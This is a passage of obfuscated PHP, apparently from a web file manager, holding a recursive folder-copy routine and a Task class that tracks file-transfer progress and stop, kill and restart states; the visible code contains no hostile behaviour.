_copyChildTo($A£”ã³¿, $aÌ¦‰µ‡Š, $f›ÉØ—ÛÙò, $a†¦ºè«ë², &$eç†½Ãœ±, $B–ŒŒ™ÂÉ) { goto F°ÌÈÆŸĞ¹; F°ÌÈÆŸĞ¹: $D¤ÏšÙ´¬° =& $_SERVER[£ü]; $CÖ®ƒ‰Ñ = $this->sourceInfoCache($f›ÉØ—ÛÙò); $A¢·‹Ëö = $A£”ã³¿->listPath($aÌ¦‰µ‡Š, !1, !0); goto BˆĞî˜§ã¦; eÊÔºª’¸: foreach ($Fğ½’Ü¡Ù as &$f”Š¯…œ”) { goto F·‡ÜâŞ·œ; F•‚ååÏ©ï: $f”Š¯…œ”[$D¤ÏšÙ´¬°[77]] = _get($f”Š¯…œ”, $D¤ÏšÙ´¬°[77], 0); $f”Š¯…œ”[$D¤ÏšÙ´¬°[415]] = _get($f”Š¯…œ”, $D¤ÏšÙ´¬°[415], 0); if (!isset($f”Š¯…œ”[$D¤ÏšÙ´¬°[537]]) && $f”Š¯…œ”[$D¤ÏšÙ´¬°[415]]) { $eç†½Ãœ±[$D¤ÏšÙ´¬°[534]][] = $f”Š¯…œ”[$D¤ÏšÙ´¬°[415]]; } goto bËËˆ­çˆÉ; F·‡ÜâŞ·œ: if (isset($BÎåàÑ²Ââ[$f”Š¯…œ”[$D¤ÏšÙ´¬°[28]]])) { $f”Š¯…œ” = $BÎåàÑ²Ââ[$f”Š¯…œ”[$D¤ÏšÙ´¬°[28]]]; } $f”Š¯…œ”[$D¤ÏšÙ´¬°[367]] = $f”Š¯…œ”[$D¤ÏšÙ´¬°[29]] == $D¤ÏšÙ´¬°[76]; $f”Š¯…œ”[$D¤ÏšÙ´¬°[369]] = _get($f”Š¯…œ”, $D¤ÏšÙ´¬°[157], $D¤ÏšÙ´¬°[33]); goto F•‚ååÏ©ï; bËËˆ­çˆÉ: if ($a†¦ºè«ë²) { $a§‘¤ŠÃ³­ = $this->fileNameExistCache($f›ÉØ—ÛÙò, $f”Š¯…œ”[$D¤ÏšÙ´¬°[28]]); if ($a§‘¤ŠÃ³­) { if ($f”Š¯…œ”[$D¤ÏšÙ´¬°[367]] || $a†¦ºè«ë² == REPEAT_SKIP) { continue; } if ($a†¦ºè«ë² == REPEAT_REPLACE) { $dÑ»ù÷‘ğÄ = $this->sourceInfoCache($a§‘¤ŠÃ³­); $a˜¥Ä½£à« = $this->fileHistory($dÑ»ù÷‘ğÄ, $f”Š¯…œ”[$D¤ÏšÙ´¬°[415]], $f”Š¯…œ”[$D¤ÏšÙ´¬°[77]]); if ($a˜¥Ä½£à«) { $eç†½Ãœ±[$D¤ÏšÙ´¬°[497]][] = $f”Š¯…œ”[$D¤ÏšÙ´¬°[415]]; } continue; } else { if ($a†¦ºè«ë² == REPEAT_RENAME) { $f”Š¯…œ”[$D¤ÏšÙ´¬°[28]] = $this->fileNameAutoCache($f›ÉØ—ÛÙò, $f”Š¯…œ”[$D¤ÏšÙ´¬°[28]], $a†¦ºè«ë², !1); } } } } if (!$f”Š¯…œ”[$D¤ÏšÙ´¬°[367]] && $f”Š¯…œ”[$D¤ÏšÙ´¬°[415]]) { $eç†½Ãœ±[$D¤ÏšÙ´¬°[497]][] = $f”Š¯…œ”[$D¤ÏšÙ´¬°[415]]; } $aÙ®‰İôÎ¤[] = $this->_makeItemData($f”Š¯…œ”, $CÖ®ƒ‰Ñ, $f”Š¯…œ”[$D¤ÏšÙ´¬°[28]]); goto cÙ¿ÈàÄØ¡; cÙ¿ÈàÄØ¡: } unset($f”Š¯…œ”); if (!empty($aÙ®‰İôÎ¤)) { $this->addAll($aÙ®‰İôÎ¤); } goto bÇ¿øäá¯•; BˆĞî˜§ã¦: $Fğ½’Ü¡Ù = array_merge($A¢·‹Ëö[$D¤ÏšÙ´¬°[73]], $A¢·‹Ëö[$D¤ÏšÙ´¬°[74]]); $BÎåàÑ²Ââ = $this->_addFiles($A£”ã³¿, $A¢·‹Ëö[$D¤ÏšÙ´¬°[73]], $B–ŒŒ™ÂÉ); $aÙ®‰İôÎ¤ = array(); goto eÊÔºª’¸; bÇ¿øäá¯•: $f¤™¢ê‚Â¬ = $this->_childrenList($f›ÉØ—ÛÙò); $f¤™¢ê‚Â¬ = array_to_keyvalue($f¤™¢ê‚Â¬, $D¤ÏšÙ´¬°[28]); foreach ($Fğ½’Ü¡Ù as $f”Š¯…œ”) { $dÑ»ù÷‘ğÄ = $f¤™¢ê‚Â¬[$f”Š¯…œ”[$D¤ÏšÙ´¬°[28]]]; $Dä¬ï›†¤ô = $dÑ»ù÷‘ğÄ[$D¤ÏšÙ´¬°[366]]; $this->_copyApplyMeta($dÑ»ù÷‘ğÄ, $eç†½Ãœ±); if ($f”Š¯…œ”[$D¤ÏšÙ´¬°[29]] == $D¤ÏšÙ´¬°[76]) { $f”Š¯…œ”[$D¤ÏšÙ´¬°[75]] = $A£”ã³¿->getPathInner($f”Š¯…œ”[$D¤ÏšÙ´¬°[75]]); $this->_copyChildTo($A£”ã³¿, $f”Š¯…œ”[$D¤ÏšÙ´¬°[75]], $Dä¬ï›†¤ô, $a†¦ºè«ë², $eç†½Ãœ±, $B–ŒŒ™ÂÉ); } } goto CÚÄÍ†ÓÙø; CÚÄÍ†ÓÙø: } private function _addFiles($b˜¥™Ú¢§, $B­¨Æš°Ş, $C¤æÁ·ªŠ) { goto AÕî×«‡èå; EÒÂçí‘ø: $A×í¤ŸôÔ² = array($d©ÜéÇ‰”Ù[160] => array($d©ÜéÇ‰”Ù[7], array_keys($c´Û¯Ç†êÎ))); $fõ»å“ˆà = $aã—˜ß‰´×->where($A×í¤ŸôÔ²)->select(); $fõ»å“ˆà = $fõ»å“ˆà ? $fõ»å“ˆà : array(); goto Cë¡íÊô¤; Cë¡íÊô¤: foreach ($fõ»å“ˆà as $eä¾È°‡·) { if (!isset($c´Û¯Ç†êÎ[$eä¾È°‡·[$d©ÜéÇ‰”Ù[160]]])) { continue; } $fÑÚÈèÖô =& $c´Û¯Ç†êÎ[$eä¾È°‡·[$d©ÜéÇ‰”Ù[160]]]; foreach ($fÑÚÈèÖô as &$c¬ìî­¡ ¬) { $c¬ìî­¡ ¬[$d©ÜéÇ‰”Ù[415]] = $eä¾È°‡·[$d©ÜéÇ‰”Ù[415]]; } unset($c¬ìî­¡ ¬); } $b„®À–ˆ‡‹ = array(); foreach ($B­¨Æš°Ş as $A¨¿¹Æ¶Â) { $b„®À–ˆ‡‹[$A¨¿¹Æ¶Â[$d©ÜéÇ‰”Ù[28]]] = $A¨¿¹Æ¶Â; } goto dÛŸ—Ü±¼; dÛŸ—Ü±¼: return $b„®À–ˆ‡‹; goto A©‡½Şò´; C¢„š£Ë»: foreach ($B­¨Æš°Ş as &$c¬ìî­¡ ¬) { goto d¬ĞÄÌ™©; CŠ®«¿‹â‰: $c¬ìî­¡ ¬[$d©ÜéÇ‰”Ù[160]] = $dæĞÁšÉ©£; Hook::trigger($d©ÜéÇ‰”Ù[539], $c¬ìî­¡ ¬); $c´Û¯Ç†êÎ[$dæĞÁšÉ©£][] =& $c¬ìî­¡ ¬; goto DÕíÆ—Ÿâ›; DÕíÆ—Ÿâ›: if (count($c´Û¯Ç†êÎ[$dæĞÁšÉ©£]) > 1) { $c¬ìî­¡ ¬[$d©ÜéÇ‰”Ù[537]] = !0; } goto A¶ÙêÈ˜â; A×Û¨½Ş»‚: $dæĞÁšÉ©£ = $b˜¥™Ú¢§->hashMd5($c¬ìî­¡ ¬[$d©ÜéÇ‰”Ù[75]]); if (strlen($dæĞÁšÉ©£) > 10 && !isset($c´Û¯Ç†êÎ[$dæĞÁšÉ©£])) { $c´Û¯Ç†êÎ[$dæĞÁšÉ©£] = array(); } $c¬ìî­¡ ¬[$d©ÜéÇ‰”Ù[161]] = $E¯‚Ëë¼Æ¤; goto CŠ®«¿‹â‰; d¬ĞÄÌ™©: Hook::trigger($d©ÜéÇ‰”Ù[538], $c¬ìî­¡ ¬); $c¬ìî­¡ ¬[$d©ÜéÇ‰”Ù[75]] = $b˜¥™Ú¢§->getPathInner($c¬ìî­¡ ¬[$d©ÜéÇ‰”Ù[75]]); $E¯‚Ëë¼Æ¤ = $b˜¥™Ú¢§->hashSimple($c¬ìî­¡ ¬[$d©ÜéÇ‰”Ù[75]]); goto A×Û¨½Ş»‚; A¶ÙêÈ˜â: } $A×í¤ŸôÔ² = array($d©ÜéÇ‰”Ù[160] => array($d©ÜéÇ‰”Ù[7], array_keys($c´Û¯Ç†êÎ))); $aã—˜ß‰´× = Model($d©ÜéÇ‰”Ù[540]); goto eä„æº¥ÉÖ; fº¢ƒ±‚„: $eÂÌ£ˆîĞŠ = array(); foreach ($B­¨Æš°Ş as $B™ƒ¼±¹¤‹) { if (isset($B™ƒ¼±¹¤‹[$d©ÜéÇ‰”Ù[537]]) && $B™ƒ¼±¹¤‹[$d©ÜéÇ‰”Ù[537]]) { continue; } $eÜ´ëÅêÀ = $b˜¥™Ú¢§->getPathInner($B™ƒ¼±¹¤‹[$d©ÜéÇ‰”Ù[75]]); $A†¸‚Œ”éÆ = $aã—˜ß‰´×->addFileMake($eÜ´ëÅêÀ, $B™ƒ¼±¹¤‹[$d©ÜéÇ‰”Ù[77]], $B™ƒ¼±¹¤‹[$d©ÜéÇ‰”Ù[161]], $B™ƒ¼±¹¤‹[$d©ÜéÇ‰”Ù[160]], $B™ƒ¼±¹¤‹[$d©ÜéÇ‰”Ù[28]], $C¤æÁ·ªŠ); $eÂÌ£ˆîĞŠ[] = $A†¸‚Œ”éÆ; } $aã—˜ß‰´×->addAll($eÂÌ£ˆîĞŠ); goto EÒÂçí‘ø; eä„æº¥ÉÖ: $fõ»å“ˆà = $aã—˜ß‰´×->where($A×í¤ŸôÔ²)->select(); $fõ»å“ˆà = $fõ»å“ˆà ? $fõ»å“ˆà : array(); foreach ($fõ»å“ˆà as $eä¾È°‡·) { if (!isset($c´Û¯Ç†êÎ[$eä¾È°‡·[$d©ÜéÇ‰”Ù[160]]])) { continue; } $f²ÀØ®Œùç = $c´Û¯Ç†êÎ[$eä¾È°‡·[$d©ÜéÇ‰”Ù[160]]]; foreach ($f²ÀØ®Œùç as &$c¬ìî­¡ ¬) { $c¬ìî­¡ ¬[$d©ÜéÇ‰”Ù[415]] = $eä¾È°‡·[$d©ÜéÇ‰”Ù[415]]; $c¬ìî­¡ ¬[$d©ÜéÇ‰”Ù[537]] = !0; } unset($c¬ìî­¡ ¬); } goto fº¢ƒ±‚„; AÕî×«‡èå: $d©ÜéÇ‰”Ù =& $_SERVER[£ü]; if (!$B­¨Æš°Ş || count($B­¨Æš°Ş) == 0) { return array(); } $c´Û¯Ç†êÎ = array(); goto C¢„š£Ë»; A©‡½Şò´: } } define($_SERVER[£ü][541], $_SERVER[£ü][542]); goto dÔ©©®ÕÚ; f¯¼ÆÃÏ–„: class Task { const STATYS_STOP = "\x73\164\x6f\160"; const STATYS_RUNNING = "\162\x75\x6e\x6e\x69\x6e\147"; const STATYS_KILL = "\x6b\151\154\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($DÓùùÆÜ½, $FªÔÈ‚‚ì = '', $bÑ°ª¯‹Ì· = 0, $bã—¹—¡Úå = '') { goto BÈ‘¸Ñ²‰; e³³ø»çÒ: Hook::trigger($f’Š¼Øç÷[1412], $this->task); $this->task[$f’Š¼Øç÷[1406]] = timeFloat(); self::valueSet($this->task[$f’Š¼Øç÷[364]], $this->task); goto eÑÏ…äÕÓÅ; C£«ø¨ó„Ø: Hook::bind($f’Š¼Øç÷[1367], array($this, $f’Š¼Øç÷[1409])); Hook::bind($f’Š¼Øç÷[1410], array($this, $f’Š¼Øç÷[1411])); $this->startAfter(); goto e³³ø»çÒ; BÈ‘¸Ñ²‰: $f’Š¼Øç÷ =& $_SERVER[£ü]; if (self::get($DÓùùÆÜ½)) { return; } $this->task = array($f’Š¼Øç÷[364] => $DÓùùÆÜ½, $f’Š¼Øç÷[1401] => USER_ID, $f’Š¼Øç÷[1309] => $bã—¹—¡Úå, $f’Š¼Øç÷[29] => $FªÔÈ‚‚ì, $f’Š¼Øç÷[968] => $f’Š¼Øç÷[33], $f’Š¼Øç÷[966] => $bÑ°ª¯‹Ì·, $f’Š¼Øç÷[978] => 0, $f’Š¼Øç÷[1402] => 0, $f’Š¼Øç÷[1403] => 0, $f’Š¼Øç÷[1404] => timeFloat(), $f’Š¼Øç÷[1405] => 0, $f’Š¼Øç÷[1406] => 0, $f’Š¼Øç÷[1407] => 0, $f’Š¼Øç÷[1408] => 0, $f’Š¼Øç÷[678] => $f’Š¼Øç÷[1365]); goto C£«ø¨ó„Ø; eÑÏ…äÕÓÅ: } public function end() { goto eÀ·÷Ì¶¸; c°ºÂä¸©é: $F­Ëè¶áÄ³ = timeFloat() - $this->task[$aÇ ˆé˜®—[1404]]; self::log($aÇ ˆé˜®—[1413] . $this->task[$aÇ ˆé˜®—[364]] . $aÇ ˆé˜®—[1414] . $F­Ëè¶áÄ³ . $aÇ ˆé˜®—[1415]); Hook::unbind($aÇ ˆé˜®—[1367], array($this, $aÇ ˆé˜®—[1409])); goto câß¤¤–½á; eÀ·÷Ì¶¸: $aÇ ˆé˜®— =& $_SERVER[£ü]; if (!$this->task) { return; } if ($this->task[$aÇ ˆé˜®—[1406]]) { self::valueSet($this->task[$aÇ ˆé˜®—[364]], !1); } goto c°ºÂä¸©é; câß¤¤–½á: Hook::unbind($aÇ ˆé˜®—[1410], array($this, $aÇ ˆé˜®—[1411])); $this->endAfter(); $this->task = !1; goto cÁåèƒÓŞÀ; cÁåèƒÓŞÀ: } public function update($CÒº¢Õö¶À = 0) { goto e´ö‘ÖÚÓ­; f±ƒé›Ö›: $F±’´§«„Ã[$C¿‚ÓÚË„[678]] = $e§Ë¬Òñäê ? $e§Ë¬Òñäê : $F±’´§«„Ã[$C¿‚ÓÚË„[678]]; $F±’´§«„Ã[$C¿‚ÓÚË„[1407]] = $EÏ£ÉˆÜîÚ[$C¿‚ÓÚË„[1407]] ? $EÏ£ÉˆÜîÚ[$C¿‚ÓÚË„[1407]] : 0; $F±’´§«„Ã[$C¿‚ÓÚË„[1406]] = timeFloat(); goto f—İ´“…ÊÍ; f—İ´“…ÊÍ: Hook::trigger($C¿‚ÓÚË„[1419], $F±’´§«„Ã); self::valueSet($F±’´§«„Ã[$C¿‚ÓÚË„[364]], $F±’´§«„Ã); goto DóÚÓó¬è; bª÷‡¨…ŞÕ: $this->updateAfter(); $aÒŒìÕ»Á… = 0.2; if (timeFloat() - $F±’´§«„Ã[$C¿‚ÓÚË„[1406]] < $aÒŒìÕ»Á…) { return; } goto bÎóé—‰Ë; bÔ¿²­Ğ: $F±’´§«„Ã[$C¿‚ÓÚË„[978]] += $CÒº¢Õö¶À; $F±’´§«„Ã[$C¿‚ÓÚË„[1405]] = timeFloat(); if ($F±’´§«„Ã[$C¿‚ÓÚË„[966]]) { if ($F±’´§«„Ã[$C¿‚ÓÚË„[966]] < $F±’´§«„Ã[$C¿‚ÓÚË„[978]]) { $F±’´§«„Ã[$C¿‚ÓÚË„[966]] = $F±’´§«„Ã[$C¿‚ÓÚË„[978]]; } $F¸ÈîöªéÁ = timeFloat() - $F±’´§«„Ã[$C¿‚ÓÚË„[1404]] - $F±’´§«„Ã[$C¿‚ÓÚË„[1407]]; $F±’´§«„Ã[$C¿‚ÓÚË„[1402]] = $F±’´§«„Ã[$C¿‚ÓÚË„[978]] / $F±’´§«„Ã[$C¿‚ÓÚË„[966]]; $F±’´§«„Ã[$C¿‚ÓÚË„[1403]] = $F±’´§«„Ã[$C¿‚ÓÚË„[978]] / $F¸ÈîöªéÁ; if ($F±’´§«„Ã[$C¿‚ÓÚË„[1402]] > 0) { $F±’´§«„Ã[$C¿‚ÓÚË„[1408]] = $F¸ÈîöªéÁ * (1 - $F±’´§«„Ã[$C¿‚ÓÚË„[1402]]) / $F±’´§«„Ã[$C¿‚ÓÚË„[1402]]; } $F±’´§«„Ã[$C¿‚ÓÚË„[1408]] = $F±’´§«„Ã[$C¿‚ÓÚË„[1408]] <= 0 ? 0 : $F±’´§«„Ã[$C¿‚ÓÚË„[1408]]; } goto bª÷‡¨…ŞÕ; bÎóé—‰Ë: $EÏ£ÉˆÜîÚ = self::get($F±’´§«„Ã[$C¿‚ÓÚË„[364]]); $e§Ë¬Òñäê = $EÏ£ÉˆÜîÚ[$C¿‚ÓÚË„[678]]; if ($e§Ë¬Òñäê == self::STATYS_KILL) { $bÒƒ‘ØªÀ = array($C¿‚ÓÚË„[1416] => LNG($C¿‚ÓÚË„[1417]), $C¿‚ÓÚË„[1022] => !1); Cache::set($C¿‚ÓÚË„[1418] . $this->task[$C¿‚ÓÚË„[364]], $bÒƒ‘ØªÀ, 30); $this->end(); die; } else { if ($e§Ë¬Òñäê == self::STATYS_STOP) { $EŠø†“‰Ğ = 2; $EÏ£ÉˆÜîÚ[$C¿‚ÓÚË„[1407]] += $EŠø†“‰Ğ; self::valueSet($F±’´§«„Ã[$C¿‚ÓÚË„[364]], $EÏ£ÉˆÜîÚ); sleep($EŠø†“‰Ğ); $this->update(); return; } } goto f±ƒé›Ö›; e´ö‘ÖÚÓ­: $C¿‚ÓÚË„ =& $_SERVER[£ü]; $F±’´§«„Ã =& $this->task; if (!$F±’´§«„Ã) { return; } goto bÔ¿²­Ğ; DóÚÓó¬è: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($bÙäêŸ„›ì) { $C¯¶–ø×´ß =& $_SERVER[£ü]; Cache::set($C¯¶–ø×´ß[1418] . $this->task[$C¯¶–ø×´ß[364]], $bÙäêŸ„›ì, 60); return $bÙäêŸ„›ì; } public static function get($DÂ¨ÖÂ§°ó) { return self::valueGet($DÂ¨ÖÂ§°ó); } public static function listData() { $a¤Ôô¼º² = self::valueGet(); return array_sort_by($a¤Ôô¼º², $_SERVER[£ü][1404], !0); } public static function kill($FåÖç¼•í) { return self::changeStatus($FåÖç¼•í, self::STATYS_KILL); } public static function stop($d´Õ‚‡õ˜é) { return self::changeStatus($d´Õ‚‡õ˜é, self::STATYS_STOP); } public static function restart($A¶ô¢ÃŠ‘ä) { return self::changeStatus($A¶ô¢ÃŠ‘ä, self::STATYS_RUNNING); } public static function killAll() { $BÅ ·«ºğ =& $_SERVER[£ü]; $cõäÊ±£¿ = self::listData(); foreach ($cõäÊ±£¿ as $DÃ¯ïêîé) { self::kill($DÃ¯ïêîé[$BÅ ·«ºğ[364]]); } sleep(2); foreach ($cõäÊ±£¿ as $DÃ¯ïêîé) { self::valueSet($DÃ¯ïêîé[$BÅ ·«ºğ[364]], !1); } } private static function changeStatus($f­ò©¥ƒ…è, $EÒ‰Ş†ÇİÁ) { goto f®†»ƒÀ´›; f®†»ƒÀ´›: $f¦³—Î‚ë =& $_SERVER[£ü]; $B–ìÑ‘‹ò† = self::valueGet($f­ò©¥ƒ…è); if (!$B–ìÑ‘‹ò†) { return !1; } goto A±Íª±ãßì; A±Íª±ãßì: $B–ìÑ‘‹ò†[$f¦³—Î‚ë[678]] = $EÒ‰Ş†ÇİÁ; self::valueSet($f­ò©¥ƒ…è, $B–ìÑ‘‹ò†); self::log($f¦³—Î‚ë[1420] . $B–ìÑ‘‹ò†[$f¦³—Î‚ë[364]] . $f¦³—Î‚ë[1421] . $EÒ‰Ş†ÇİÁ); goto B©‰´Ï°Òù; B©‰´Ï°Òù: return !0; goto fìö¸Î‘Ñˆ; fìö¸Î‘Ñˆ: } public static function valueGet($Cìé¸×„ò = false) { $eÍë°èŸ =& $_SERVER[£ü]; if ($Cìé¸×„ò) { $bóÈò§æ” = Model($eÍë°èŸ[395])->where(array($eÍë°èŸ[89] => $Cìé¸×„ò, $eÍë°èŸ[29] => $eÍë°èŸ[1422]))->find(); return $bóÈò§æ” ? json_decode($bóÈò§æ”[$eÍë°èŸ[356]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($CŒÏÍÕƒ©ˆ = false) { goto C„¨ƒö½œ; bõ‚†ìäˆ: return $E²ª®İø‰¸; goto AíŠ’ÒÏ†ö; C„¨ƒö½œ: $eÔ—ÕÄ±‘ =& $_SERVER[£ü]; $aŠêÊš­¾Õ = array($eÔ—ÕÄ±‘[29] => $eÔ—ÕÄ±‘[1422]); if ($CŒÏÍÕƒ©ˆ) { $aŠêÊš­¾Õ[$eÔ—ÕÄ±‘[1401]] = $CŒÏÍÕƒ©ˆ; } goto B˜÷©¿ Æë; B˜÷©¿ Æë: $E²ª®İø‰¸ = Model($eÔ—ÕÄ±‘[395])->where($aŠêÊš­¾Õ)->select(); $E²ª®İø‰¸ = $E²ª®İø‰¸ ? $E²ª®İø‰¸ : array(); foreach ($E²ª®İø‰¸ as $f…Û ÔŒœø => $dãõ™©ÄêÀ) { $E²ª®İø‰¸[$f…Û ÔŒœø] = json_decode($dãõ™©ÄêÀ[$eÔ—ÕÄ±‘[356]], !0); } goto bõ‚†ìäˆ; AíŠ’ÒÏ†ö: } public static function valueSet($c˜®Ìóß«, $B¯¼ãÅ¹¹) { goto Cå¤Ê‡¸ôó; C²ÕÈèìºÙ: Model($D¿èÊ¾óê¿[395])->add($eŞ¶¡ÉëÛ°, array(), !0); goto a¶ñÎ®Á‰Õ; f‰Ú‘ÅíÊÌ: if (!$EÈ‰Üİİ) { ob_start(); var_dump($B¯¼ãÅ¹¹); $FöÎ‚ØÀğ§ = ob_get_clean(); self::log($D¿èÊ¾óê¿[1423] . json_encode_force($FöÎ‚ØÀğ§)); } if (!$c˜®Ìóß« || !$B¯¼ãÅ¹¹[$D¿èÊ¾óê¿[364]]) { return !1; } $eŞ¶¡ÉëÛ° = array($D¿èÊ¾óê¿[29] => $D¿èÊ¾óê¿[1422], $D¿èÊ¾óê¿[1401] => USER_ID, $D¿èÊ¾óê¿[89] => $c˜®Ìóß«, $D¿èÊ¾óê¿[356] => $EÈ‰Üİİ); goto C²ÕÈèìºÙ; Cå¤Ê‡¸ôó: $D¿èÊ¾óê¿ =& $_SERVER[£ü]; if (!$B¯¼ãÅ¹¹) { return Model($D¿èÊ¾óê¿[395])->where(array($D¿èÊ¾óê¿[89] => $c˜®Ìóß«, $D¿èÊ¾óê¿[29] => $D¿èÊ¾óê¿[1422]))->delete(); } $EÈ‰Üİİ = json_encode($B¯¼ãÅ¹¹); goto f‰Ú‘ÅíÊÌ; a¶ñÎ®Á‰Õ: } public static function log($A‚òÔĞÔ) { write_log($A‚òÔĞÔ, $_SERVER[£ü][1424]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto fÛ—¨‚¿­¼; bìí‚¨ËâÖ: Hook::bind($bîÛ´ÄŠ™[1425], array($this, $bîÛ´ÄŠ™[1426])); Hook::bind($bîÛ´ÄŠ™[1427], array($this, $bîÛ´ÄŠ™[1428])); Hook::bind($bîÛ´ÄŠ™[1429], array($this, $bîÛ´ÄŠ™[1430])); goto fƒô‹ÇŞ¶­; bÈìØÃ‰ì: $CğÔ¶á¢”Ï[$bîÛ´ÄŠ™[1444]] = LNG($bîÛ´ÄŠ™[1445]); $CğÔ¶á¢”Ï[$bîÛ´ÄŠ™[1446]] = 0; $CğÔ¶á¢”Ï[$bîÛ´ÄŠ™[1447]] = 0; goto eÊš¦‚’­¦; e‹…ÂÄÆ: Hook::bind($bîÛ´ÄŠ™[1435], array($this, $bîÛ´ÄŠ™[1436])); Hook::bind($bîÛ´ÄŠ™[528], array($this, $bîÛ´ÄŠ™[1437])); $this->sourceModelCopyFlag = !1; goto A‹Ãšô±Š¯; A‹Ãšô±Š¯: Hook::bind($bîÛ´ÄŠ™[1438], array($this, $bîÛ´ÄŠ™[1439])); Hook::bind($bîÛ´ÄŠ™[1440], array($this, $bîÛ´ÄŠ™[1441])); Hook::bind($bîÛ´ÄŠ™[1442], array($this, $bîÛ´ÄŠ™[1443])); goto bÈìØÃ‰ì; fÛ—¨‚¿­¼: $bîÛ´ÄŠ™ =& $_SERVER[£ü]; $CğÔ¶á¢”Ï =& $this->task; $this->sourceCopyFolder = !1; goto bìí‚¨ËâÖ; fƒô‹ÇŞ¶­: Hook::bind($bîÛ´ÄŠ™[535], array($this, $bîÛ´ÄŠ™[1431])); Hook::bind($bîÛ´ÄŠ™[536], array($this, $bîÛ´ÄŠ™[1432])); Hook::bind($bîÛ´ÄŠ™[538], array($this, $bîÛ´ÄŠ™[1433])); goto b²ŸØ¨†«£; eãÇ¡²ÜŞå: Hook::bind($bîÛ´ÄŠ™[507], array($this, $bîÛ´ÄŠ™[1434])); Hook::bind($bîÛ´ÄŠ™[509], array($this, $bîÛ´ÄŠ™[1434])); Hook::bind($bîÛ´ÄŠ™[511], array($this, $bîÛ´ÄŠ™[1434])); goto e‹…ÂÄÆ; eÊš¦‚’­¦: $CğÔ¶á¢”Ï[$bîÛ´ÄŠ™[968]] = $bîÛ´ÄŠ™[33]; $CğÔ¶á¢”Ï[$bîÛ´ÄŠ™[1448]] = $bîÛ´ÄŠ™[33]; $CğÔ¶á¢”Ï[$bîÛ´ÄŠ™[1449]] = 0; goto B¿³ÑÖÓÎ; b²ŸØ¨†«£: Hook::bind($bîÛ´ÄŠ™[539], array($this, $bîÛ´ÄŠ™[1433])); Hook::bind($bîÛ´ÄŠ™[505], array($this, $bîÛ´ÄŠ™[1434])); Hook::bind($bîÛ´ÄŠ™[502], array($this, $bîÛ´ÄŠ™[1434])); goto eãÇ¡²ÜŞå; B¿³ÑÖÓÎ: if (!$CğÔ¶á¢”Ï[$bîÛ´ÄŠ™[1309]]) { $CğÔ¶á¢”Ï[$bîÛ´ÄŠ™[1309]] = LNG($bîÛ´ÄŠ™[1450]); } goto aÆÈ³Ü©ô´; aÆÈ³Ü©ô´: } protected function endAfter() { goto fÅÊŞ¤à¯; f‚ÌÒŠºğÅ: Hook::unbind($b…ÈŠ“ö–[1429], array($this, $b…ÈŠ“ö–[1430])); Hook::unbind($b…ÈŠ“ö–[535], array($this, $b…ÈŠ“ö–[1431])); Hook::unbind($b…ÈŠ“ö–[536], array($this, $b…ÈŠ“ö–[1432])); goto Fßå¼› Å¥; Fßå¼› Å¥: Hook::unbind($b…ÈŠ“ö–[538], array($this, $b…ÈŠ“ö–[1433])); Hook::unbind($b…ÈŠ“ö–[539], array($this, $b…ÈŠ“ö–[1433])); Hook::unbind($b…ÈŠ“ö–[505], array($this, $b…ÈŠ“ö–[1434])); goto F—Œºã‚Ï; F—Œºã‚Ï: Hook::unbind($b…ÈŠ“ö–[502], array($this, $b…ÈŠ“ö–[1434])); Hook::unbind($b…ÈŠ“ö–[507], array($this, $b…ÈŠ“ö–[1434])); Hook::unbind($b…ÈŠ“ö–[509], array($this, $b…ÈŠ“ö–[1434])); goto CÓµƒ—Ñä÷; fÅÊŞ¤à¯: $b…ÈŠ“ö– =& $_SERVER[£ü]; Hook::unbind($b…ÈŠ“ö–[1425], array($this, $b…ÈŠ“ö–[1426])); Hook::unbind($b…ÈŠ“ö–[1427], array($this, $b…ÈŠ“ö–[1428])); goto f‚ÌÒŠºğÅ; eŠÌ–ã›: Hook::unbind($b…ÈŠ“ö–[1438], array($this, $b…ÈŠ“ö–[1439])); Hook::unbind($b…ÈŠ“ö–[1440], array($this, $b…ÈŠ“ö–[1441])); Hook::unbind($b…ÈŠ“ö–[1442], array($this, $b…ÈŠ“ö–[1443])); goto DÏİ¢ĞÑ¯; CÓµƒ—Ñä÷: Hook::unbind($b…ÈŠ“ö–[511], array($this, $b…ÈŠ“ö–[1434])); Hook::unbind($b…ÈŠ“ö–[1435], array($this, $b…ÈŠ“ö–[1436])); Hook::unbind($b…ÈŠ“ö–[528], array($this, $b…ÈŠ“ö–[1437])); goto eŠÌ–ã›; DÏİ¢ĞÑ¯: } public function copyMoveStart($D±¾§³âëö, $Bà£¯œÄÜŠ, $aÒÑÛÎóñ, $dî‹ñ»³) { } public function updateAfter() { goto A‡§¼­¥ŸÙ; dÀ›åí˜Ç : if ($this->sourceModelCopyFlag) { return; } $aŞ¨É»á¶ = 0; if ($e¯ÑãÑ®Æ‘[$a§×Æ½Š[1448]] == $a§×Æ½Š[1030]) { $aŞ¨É»á¶ = $e¯ÑãÑ®Æ‘[$a§×Æ½Š[1447]] * 0.5; } else { if ($e¯ÑãÑ®Æ‘[$a§×Æ½Š[1448]] == $a§×Æ½Š[91]) { $aŞ¨É»á¶ = $e¯ÑãÑ®Æ‘[$a§×Æ½Š[1447]] * 0.5 + $e¯ÑãÑ®Æ‘[$a§×Æ½Š[1446]] * 0.5; } } goto bÄ®¹Âó; A‡§¼­¥ŸÙ: $a§×Æ½Š =& $_SERVER[£ü]; $e¯ÑãÑ®Æ‘ =& $this->task; if (!$e¯ÑãÑ®Æ‘[$a§×Æ½Š[687]]) { return; } goto dÀ›åí˜Ç ; bÄ®¹Âó: $e¯ÑãÑ®Æ‘[$a§×Æ½Š[1402]] = ($e¯ÑãÑ®Æ‘[$a§×Æ½Š[1451]] + $aŞ¨É»á¶) / $e¯ÑãÑ®Æ‘[$a§×Æ½Š[687]]; if ($e¯ÑãÑ®Æ‘[$a§×Æ½Š[1402]] > 0) { $FŞ¾¿…¼Ú´ = timeFloat() - $e¯ÑãÑ®Æ‘[$a§×Æ½Š[1404]] - $e¯ÑãÑ®Æ‘[$a§×Æ½Š[1407]]; $e¯ÑãÑ®Æ‘[$a§×Æ½Š[1408]] = $FŞ¾¿…¼Ú´ * (1 - $e¯ÑãÑ®Æ‘[$a§×Æ½Š[1402]]) / $e¯ÑãÑ®Æ‘[$a§×Æ½Š[1402]]; } goto fÑèèˆöƒ; fÑèèˆöƒ: } public function addPath($D©•ÈÕ¨ïà) { goto fß–¼ö‹‹; fß–¼ö‹‹: $Eá•µ¿×²” =& 